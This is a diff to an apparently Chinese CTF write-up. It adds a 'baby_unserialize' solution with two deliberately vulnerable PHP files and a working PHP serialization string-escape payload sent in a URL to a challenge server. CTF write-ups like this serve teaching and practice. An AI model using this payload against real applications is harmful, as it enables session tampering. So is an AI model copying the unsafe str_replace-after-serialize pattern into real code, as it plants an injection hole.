@@ -231,7 +231,7 @@ moectf{Y0u_are_t00_baby_la};
 ?>
 ```
 
-## sqlmap_boy
+### sqlmap_boy
 
 右键源代码
 
@@ -306,6 +306,77 @@ http://82.156.5.200:1042/?aaa=flag&flag=aaa
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209111205572.png)
 
 貌似没怎么用到 `$_POST`
+
+### baby_unserialize
+
+index.php
+
+```php
+<?php
+session_start();
+highlight_file(__FILE__);
+
+class moectf{
+    public $a;
+    public $b;
+    public $token='heizi';
+    public function __construct($r,$s){
+        $this->a = $r;
+        $this->b = $s;
+    }
+}
+
+$r = $_GET['r'];
+$s = $_GET['s'];
+
+if(isset($r) && isset($s) ){
+    $moe = new moectf($r,$s);
+    $emo = str_replace('aiyo', 'ganma', serialize($moe));
+    $_SESSION['moe']=base64_encode($emo);
+
+}
+
+'a.php';
+```
+
+a.php
+
+```php
+<?php
+session_start();
+highlight_file(__FILE__);
+
+include('flag.php');
+
+class moectf{
+    public $a;
+    public $b;
+    public $token='heizi';
+    public function __construct($r,$s){
+        $this->a = $r;
+        $this->b = $s;
+    }
+}
+
+if($_COOKIE['moe'] == 1){
+    $moe = unserialize(base64_decode($_SESSION['moe']));
+    if($moe->token=='baizi'){
+        echo $flag;
+    }
+}
+```
+
+字符串逃逸, 而且是增长逃逸
+
+`";s:5:"token";s:5:"baizi";}` 长度为 27, 因此输入 27 个 aiyo
+
+```
+http://43.138.48.124:12345/?r=123&s=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo";s:5:"token";s:5:"baizi";}
+```
+
+最后改一下 cookie 就能得到 flag 了
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210021411627.png)
 
 ### 支付系统
 
@@ -987,7 +1058,6 @@ moectf{attacking_the_vigenere_cipher_is_interesting}
 尴尬, 忘记怎么写的了...
 
 密钥是 `ghijklmnopqrstuvwxyzabcdef`
-
 
 ## 软件逆向工程
 
